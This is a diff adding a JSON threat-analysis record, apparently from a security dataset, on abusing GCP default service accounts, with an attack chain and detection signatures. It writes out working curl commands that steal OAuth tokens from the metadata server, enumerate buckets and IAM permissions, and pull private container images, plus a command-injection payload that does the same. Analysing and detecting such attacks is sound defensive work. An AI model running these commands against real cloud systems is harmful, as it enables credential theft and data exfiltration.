@@ -1,0 +1,174 @@
+{
+  "package_info": {
+    "package_name": "GCP Default Service Account Abuse",
+    "package_manager": "cloud-native (GCP environment)",
+    "package_versions": "All GCP projects using default Compute Engine service accounts (no specific versioning)",
+    "why_malicious": "The default Compute Engine service account, when assigned to VMs or GKE nodes with broad scopes, enables attackers to trivially retrieve OAuth tokens from the metadata server. These tokens can be used to access sensitive cloud resources (GCS buckets, Artifact Registry, project IAM policies) with excessive privileges, often including project-wide admin rights. This is a systemic misconfiguration that enables privilege escalation and data exfiltration attacks."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (on compromised VM or pod)",
+        "file_location": "metadata server (http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/[SERVICE_ACCOUNT]/token)",
+        "required_permissions": [
+          "network (access to metadata server)",
+          "environment_vars (to use token)",
+          "cloud API access"
+        ]
+      },
+      "code_snippet": "curl -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/vm-service-account@datadog-security-labs.iam.gserviceaccount.com/token",
+      "code_language": "shell",
+      "code_behavior": "At runtime, the code sends an HTTP request to the instance metadata server to retrieve an OAuth access token for the attached service account, enabling subsequent authenticated access to Google Cloud APIs.",
+      "malice_analysis": {
+        "why_suspicious": "Accessing the metadata server to retrieve service account tokens is a common cloud privilege escalation and credential theft technique.",
+        "violated_expectations": "Normal applications should not programmatically extract and export their own cloud credentials for arbitrary use; this is typically only done by cloud SDKs or agents with explicit need.",
+        "similar_legitimate_use": "Cloud SDKs and agents may retrieve tokens for legitimate API access, but not for exfiltration or privilege escalation.",
+        "key_indicators": [
+          "Direct HTTP requests to metadata server endpoints for service account tokens",
+          "Use of 'Metadata-Flavor: Google' header",
+          "Retrieval of /token endpoint"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (after token theft)",
+        "file_location": "any shell or process with access to the token",
+        "required_permissions": [
+          "network (outbound to Google APIs)",
+          "environment_vars (to set token)",
+          "cloud API access"
+        ]
+      },
+      "code_snippet": "export CLOUDSDK_AUTH_ACCESS_TOKEN=ya29.c...\ncurl -H \"Authorization: Bearer $ACCESS_TOKEN\" 'https://storage.googleapis.com/storage/v1/b?project=datadog-security-labs'",
+      "code_language": "shell",
+      "code_behavior": "After retrieving the access token, the code sets it as an environment variable and uses it to authenticate API requests, such as listing all Google Cloud Storage buckets in the project.",
+      "malice_analysis": {
+        "why_suspicious": "Using a stolen or programmatically retrieved access token to enumerate or access cloud resources is a hallmark of cloud credential abuse.",
+        "violated_expectations": "Normal applications should not use tokens retrieved from the metadata server to enumerate or exfiltrate resources outside their intended scope.",
+        "similar_legitimate_use": "Cloud automation tools may use tokens for resource management, but not for unauthorized enumeration or exfiltration.",
+        "key_indicators": [
+          "Setting CLOUDSDK_AUTH_ACCESS_TOKEN from metadata server token",
+          "API calls to list or access sensitive resources using ephemeral tokens"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (after token theft)",
+        "file_location": "any shell or process with access to the token",
+        "required_permissions": [
+          "network (outbound to Google APIs)",
+          "cloud API access"
+        ]
+      },
+      "code_snippet": "curl https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}:testIamPermissions \\\n  -H \"Authorization: Bearer $ACCESS_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"permissions\": [\n      \"storage.buckets.list\",\n      \"compute.instances.create\"\n    ]\n  }'",
+      "code_language": "shell",
+      "code_behavior": "After obtaining the access token, the code tests which IAM permissions are available to the compromised service account by querying the testIamPermissions API endpoint.",
+      "malice_analysis": {
+        "why_suspicious": "Programmatically probing for available permissions is a reconnaissance step typical of attackers seeking privilege escalation or lateral movement.",
+        "violated_expectations": "Legitimate applications rarely enumerate their own permissions in this way; this is more common in penetration testing or malicious activity.",
+        "similar_legitimate_use": "Security auditing tools may use this for compliance checks.",
+        "key_indicators": [
+          "API calls to testIamPermissions endpoint",
+          "Batch testing of multiple permissions"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (after token theft)",
+        "file_location": "any shell or process with access to the token",
+        "required_permissions": [
+          "network (outbound to Artifact Registry)",
+          "cloud API access"
+        ]
+      },
+      "code_snippet": "curl https://europe-west6-docker.pkg.dev/v2/_catalog -H \"Authorization: Bearer $ACCESS_TOKEN\"\ndocker login -u oauth2accesstoken -p $ACCESS_TOKEN europe-west6-docker.pkg.dev\ndocker pull europe-west6-docker.pkg.dev/datadog-security-labs/my-repo/microservice",
+      "code_language": "shell",
+      "code_behavior": "After obtaining the access token, the code lists private container images in Artifact Registry and pulls them using Docker, potentially exfiltrating sensitive images.",
+      "malice_analysis": {
+        "why_suspicious": "Accessing and pulling private container images using a token not intended for this purpose is a form of data exfiltration.",
+        "violated_expectations": "Normal workloads should only pull images they are authorized for, not enumerate or mass-download all images in a project.",
+        "similar_legitimate_use": "CI/CD pipelines may pull images, but not enumerate all repositories.",
+        "key_indicators": [
+          "Listing Artifact Registry repositories with access token",
+          "Docker login using ephemeral OAuth token"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "runtime (via command injection in vulnerable pod)",
+        "file_location": "injected command in vulnerable application (e.g., via HTTP request to pod)",
+        "required_permissions": [
+          "network (access to metadata server)",
+          "cloud API access"
+        ]
+      },
+      "code_snippet": "google.com>/dev/null && curl -H Metadata-Flavor:Google 169.254.169.254/computeMetadata/v1/instance/service-accounts/712781682929-compute@developer.gserviceaccount.com/token",
+      "code_language": "shell",
+      "code_behavior": "At runtime, an attacker exploits a command injection vulnerability in a pod to execute a curl command that retrieves the node's service account token from the metadata server.",
+      "malice_analysis": {
+        "why_suspicious": "Command injection to access the metadata server is a well-known cloud attack vector for lateral movement and privilege escalation.",
+        "violated_expectations": "Applications should not allow arbitrary command execution, nor should they expose metadata server access to untrusted code.",
+        "similar_legitimate_use": "None; this is always malicious when triggered via injection.",
+        "key_indicators": [
+          "Command injection payloads targeting metadata server",
+          "Use of 169.254.169.254/computeMetadata/v1/instance/service-accounts"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker gains code execution on a VM or pod (e.g., via command injection or compromised workload).",
+      "implemented_by": [
+        "snippet_5"
+      ],
+      "leads_to": "Access to metadata server for credential theft"
+    },
+    {
+      "step": 2,
+      "action": "Attacker retrieves the service account OAuth token from the metadata server.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_5"
+      ],
+      "leads_to": "Possession of valid cloud API credentials"
+    },
+    {
+      "step": 3,
+      "action": "Attacker uses the token to enumerate and access cloud resources (GCS buckets, Artifact Registry, IAM policies).",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Data exfiltration, privilege escalation, or further lateral movement"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Unusual or frequent HTTP requests to metadata server endpoints for service account tokens",
+      "API calls to testIamPermissions or getIamPolicy endpoints from non-administrative workloads",
+      "Enumeration or mass access of GCS buckets or Artifact Registry repositories from unexpected sources",
+      "Docker login using ephemeral OAuth tokens from non-CI/CD workloads"
+    ],
+    "file_indicators": [
+      "Presence of scripts or binaries making direct HTTP calls to metadata.google.internal or 169.254.169.254",
+      "Injected shell commands in application logs referencing metadata server endpoints"
+    ],
+    "network_indicators": [
+      "Outbound requests to metadata.google.internal or 169.254.169.254 from pods or VMs",
+      "Unusual API calls to Google Cloud Storage, Artifact Registry, or IAM APIs using tokens sourced from metadata server"
+    ],
+    "how_to_detect": "Monitor for direct HTTP requests to the metadata server endpoints from within workloads, especially those targeting /computeMetadata/v1/instance/service-accounts/*/token. Flag any use of access tokens retrieved from the metadata server that are used to enumerate or access resources outside the expected scope of the workload. Detect command injection attempts in application logs that reference metadata server endpoints. Alert on Docker login or image pull operations using ephemeral OAuth tokens from non-standard sources. Correlate these behaviors with the use of default service accounts and broad OAuth scopes."
+  }
+}
